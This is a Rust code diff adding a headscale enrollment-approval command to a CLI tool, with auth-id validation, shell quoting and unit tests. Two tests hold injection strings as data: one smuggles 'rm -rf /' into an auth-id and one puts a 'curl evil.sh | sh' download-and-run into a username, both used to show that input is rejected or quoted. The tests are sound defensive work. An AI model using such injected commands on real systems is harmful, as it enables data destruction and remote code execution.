@@ -76,6 +76,25 @@ pub enum HeadscaleCommands {
         #[arg(short = 'H', long, help = "Target host running headscale")]
         host: Option<String>,
     },
+    #[command(
+        visible_alias = "rg",
+        about = "Approve a pending interactive enrollment"
+    )]
+    Register {
+        #[arg(
+            value_name = "URL_OR_AUTH_ID",
+            help = "Register URL shown by the enrolling device, or the bare hskey-authreq-… id"
+        )]
+        auth: String,
+        #[arg(
+            short,
+            long,
+            help = "Existing username (prompts from users list when omitted)"
+        )]
+        user: Option<String>,
+        #[arg(short = 'H', long, help = "Target host running headscale")]
+        host: Option<String>,
+    },
     #[command(visible_alias = "lu", about = "List registered users")]
     ListUsers {
         #[arg(
@@ -429,6 +448,56 @@ fn list_nodes(session: &dyn SshSession) -> Result<Vec<HeadscaleNode>> {
     )
 }
 
+/// The auth-id out of what the enrolling device shows: the full register URL
+/// (`https://hs.…/register/hskey-authreq-…` — a trailing slash, query string,
+/// or fragment appended by a share sheet is tolerated) or the bare
+/// `hskey-authreq-…` id. Anything else is rejected *here*, locally, before
+/// an SSH round trip could carry it to a `sudo` command line — and the shape
+/// this admits (prefix + ASCII alphanumerics) contains no shell metacharacter,
+/// though [`quote`] still wraps it downstream.
+fn parse_auth_id(input: &str) -> Result<String> {
+    let trimmed = input.trim();
+    let path = match trimmed.find(['?', '#']) {
+        Some(i) => &trimmed[..i],
+        None => trimmed,
+    };
+    let path = path.trim_end_matches('/');
+    let candidate = match path.rfind('/') {
+        Some(i) => &path[i + 1..],
+        None => path,
+    };
+    let is_auth_id = candidate
+        .strip_prefix("hskey-authreq-")
+        .is_some_and(|suffix| {
+            !suffix.is_empty() && suffix.chars().all(|c| c.is_ascii_alphanumeric())
+        });
+    if !is_auth_id {
+        eyre::bail!(
+            "'{}' is neither a register URL (https://…/register/hskey-authreq-…) \
+             nor a bare hskey-authreq-… id",
+            input
+        );
+    }
+    Ok(candidate.to_string())
+}
+
+/// `auth register` approves the pending interactive enrollment the auth-id
+/// names. `--user` is a string on this subcommand in 0.29.3 — the
+/// `preauthkeys create` uint trap (#707) does not apply (verified live during
+/// the #712 flag day). Both interpolated values are text reaching a `sudo`
+/// command line: the username comes from headscale's own store (the
+/// `remove-user` lesson), the auth-id from a pasted URL, so both ride quoted.
+fn register_node(session: &dyn SshSession, auth_id: &str, username: &str) -> Result<String> {
+    run_headscale_cmd(
+        session,
+        &format!(
+            "auth register --auth-id {} --user {}",
+            quote(auth_id),
+            quote(username)
+        ),
+    )
+}
+
 /// `users destroy` still resolves a user by `--name` on 0.29.3, unlike
 /// `preauthkeys create`; `--force` is the global flag that answers its
 /// confirmation prompt.
@@ -528,6 +597,35 @@ fn find_user(session: &dyn SshSession, username: &str) -> Result<HeadscaleUser> 
         })
 }
 
+/// A user that must already exist, resolved against one `users list`: a name
+/// given via `--user` is matched locally ([`find_user`]), an omitted one goes
+/// through the picker over that same listing. What of the resolved user then
+/// reaches a command line is each caller's contract: add-key interpolates the
+/// `u64` id (#707's lesson), register the name (`auth register --user` takes
+/// a string on 0.29.3).
+fn resolve_existing_user(
+    session: &dyn SshSession,
+    user: Option<String>,
+    is_tty: bool,
+    prompt: &str,
+) -> Result<HeadscaleUser> {
+    match user {
+        Some(name) => find_user(session, &name),
+        None if is_tty => {
+            let users = list_users(session)?;
+            select_item(
+                &users,
+                |u| format!("{} (id: {})", u.name, u.id),
+                Choice::new("user")
+                    .with_prompt(prompt)
+                    .resolved_by("--user <name>")
+                    .populated_by("auberge headscale add-user"),
+            )
+        }
+        None => eyre::bail!("Username is required (pass --user or run interactively)"),
+    }
+}
+
 /// A key for a user that already exists, which is what `add-user` refuses
 /// (#711) — the second and third device under the one #510 user had no CLI
 /// path.
@@ -542,24 +640,9 @@ pub fn run_headscale_add_key(
 
     let is_tty = std::io::stdin().is_terminal();
 
-    // Either path lists once and mints against the id that one listing
-    // carried — the picker's displayed id is the minted id, with no second
-    // round trip for a rename to slip between.
-    let user = match user {
-        Some(name) => find_user(&session, &name)?,
-        None if is_tty => {
-            let users = list_users(&session)?;
-            select_item(
-                &users,
-                |u| format!("{} (id: {})", u.name, u.id),
-                Choice::new("user")
-                    .with_prompt("Select user to mint a key for")
-                    .resolved_by("--user <name>")
-                    .populated_by("auberge headscale add-user"),
-            )?
-        }
-        None => eyre::bail!("Username is required (pass --user or run interactively)"),
-    };
+    // The picker's displayed id is the minted id — no second round trip for
+    // a rename to slip between the listing and the mint.
+    let user = resolve_existing_user(&session, user, is_tty, "Select user to mint a key for")?;
 
     let exp = resolve_expiration(expiration, is_tty)?;
     validate_expiration(&exp)?;
@@ -574,6 +657,45 @@ pub fn run_headscale_add_key(
     print_enrollment_instructions(&key)?;
 
     output::success("Done");
+    Ok(())
+}
+
+/// Approves the pending interactive enrollment a device is waiting on — the
+/// flow (Android app, or `tailscale up` without `--authkey`) that ends at a
+/// browser page instructing `headscale auth register --auth-id … --user …`,
+/// which until #724 meant hand-copying the auth-id into an ssh one-liner.
+///
+/// The auth-id is parsed and shape-checked before anything touches the
+/// network; user resolution shares add-key's ([`resolve_existing_user`]) —
+/// but what reaches the command line here is the *name*, not the listed id:
+/// `auth register --user` takes a string on 0.29.3, so headscale re-resolves
+/// it remotely, and a rename landing between the listing and the register is
+/// not closed out the way add-key's id-threading closes it.
+pub fn run_headscale_register(
+    auth: String,
+    user: Option<String>,
+    host: Option<String>,
+) -> Result<()> {
+    let auth_id = parse_auth_id(&auth)?;
+
+    let (host_info, ssh_key) = resolve_headscale_host(host)?;
+    let session = LiveSshSession::new(&host_info, &ssh_key);
+
+    let is_tty = std::io::stdin().is_terminal();
+
+    let user = resolve_existing_user(
+        &session,
+        user,
+        is_tty,
+        "Select user to register the node under",
+    )?;
+
+    output::info(&format!("Registering {} under '{}'...", auth_id, user.name));
+    let response = register_node(&session, &auth_id, &user.name)?;
+    if !response.is_empty() {
+        println!("{}", response);
+    }
+    output::success(&format!("Node registered under '{}'", user.name));
     Ok(())
 }
 
@@ -936,6 +1058,124 @@ mod tests {
                         .to_string()
                 ),
             ]
+        );
+    }
+
+    #[test]
+    fn parse_auth_id_reads_the_id_off_the_register_url() {
+        assert_eq!(
+            parse_auth_id("https://hs.example.com/register/hskey-authreq-x7K9m2P4qL8wN3vB5tR6yH1z")
+                .unwrap(),
+            "hskey-authreq-x7K9m2P4qL8wN3vB5tR6yH1z"
+        );
+    }
+
+    #[test]
+    fn parse_auth_id_tolerates_a_trailing_slash() {
+        assert_eq!(
+            parse_auth_id("https://hs.example.com/register/hskey-authreq-abc123/").unwrap(),
+            "hskey-authreq-abc123"
+        );
+    }
+
+    #[test]
+    fn parse_auth_id_accepts_the_bare_id() {
+        assert_eq!(
+            parse_auth_id("hskey-authreq-abc123").unwrap(),
+            "hskey-authreq-abc123"
+        );
+    }
+
+    /// A chat client or share sheet can append tracking params or a fragment
+    /// to the pasted URL; the id survives them.
+    #[test]
+    fn parse_auth_id_strips_a_query_string_or_fragment() {
+        assert_eq!(
+            parse_auth_id("https://hs.example.com/register/hskey-authreq-abc123?utm_source=x")
+                .unwrap(),
+            "hskey-authreq-abc123"
+        );
+        assert_eq!(
+            parse_auth_id("https://hs.example.com/register/hskey-authreq-abc123/#top").unwrap(),
+            "hskey-authreq-abc123"
+        );
+    }
+
+    /// Rejection is local and names both accepted shapes — no SSH round trip
+    /// happens for input that is neither.
+    #[test]
+    fn parse_auth_id_rejects_garbage_naming_both_shapes() {
+        for garbage in [
+            "not-an-auth-id",
+            "hskey-authreq-",
+            "hskey-authreq-abc;rm -rf /",
+            "https://hs.example.com/register/",
+            "",
+        ] {
+            let err = parse_auth_id(garbage).unwrap_err();
+            let msg = err.to_string();
+            assert!(msg.contains("register URL"), "{garbage:?}: {msg}");
+            assert!(msg.contains("hskey-authreq-"), "{garbage:?}: {msg}");
+        }
+    }
+
+    /// #724's threading, in add-key's shape: the name the *listing* carried is
+    /// what reaches `auth register`, after exactly two remote commands.
+    #[test]
+    fn register_approves_the_enrollment_for_the_listed_user() {
+        let mock = MockSshSession::new();
+        mock.stage_run_result(CommandResult::from_stdout(USERS_LIST_JSON));
+        mock.stage_run_result(CommandResult::from_stdout("Node lechuck registered"));
+
+        let user = find_user(&mock, "alice").unwrap();
+        let response = register_node(&mock, "hskey-authreq-abc123", &user.name).unwrap();
+        assert_eq!(response, "Node lechuck registered");
+
+        assert_eq!(
+            mock.calls(),
+            vec![
+                SshOp::Run("sudo headscale users list -o json".to_string()),
+                SshOp::Run(
+                    "sudo headscale auth register --auth-id hskey-authreq-abc123 --user alice"
+                        .to_string()
+                ),
+            ]
+        );
+    }
+
+    /// A name from the picker comes from headscale's own store, where an OIDC
+    /// claim or `users rename` can put anything; it reaches a `sudo` command
+    /// line here, so it rides quoted (the `remove-user` lesson).
+    #[test]
+    fn a_store_username_cannot_break_out_of_the_register_command_line() {
+        let mock = MockSshSession::new();
+        register_node(&mock, "hskey-authreq-abc123", "alice; curl evil.sh | sh").unwrap();
+        assert_eq!(
+            mock.calls(),
+            vec![SshOp::Run(
+                "sudo headscale auth register --auth-id hskey-authreq-abc123 \
+                 --user 'alice; curl evil.sh | sh'"
+                    .to_string()
+            )]
+        );
+    }
+
+    /// An expired or unknown auth-id (headscale's registration cache lives
+    /// ~15 min) surfaces headscale's stderr verbatim and fails.
+    #[test]
+    fn register_reports_headscales_error_when_the_auth_id_is_unknown() {
+        let mock = MockSshSession::new();
+        mock.stage_run_result(CommandResult {
+            success: false,
+            exit_code: Some(1),
+            stdout: Vec::new(),
+            stderr: b"node not found in registration cache".to_vec(),
+        });
+        let err = register_node(&mock, "hskey-authreq-abc123", "alice").unwrap_err();
+        assert!(
+            err.to_string()
+                .contains("node not found in registration cache"),
+            "{err}"
         );
     }
 
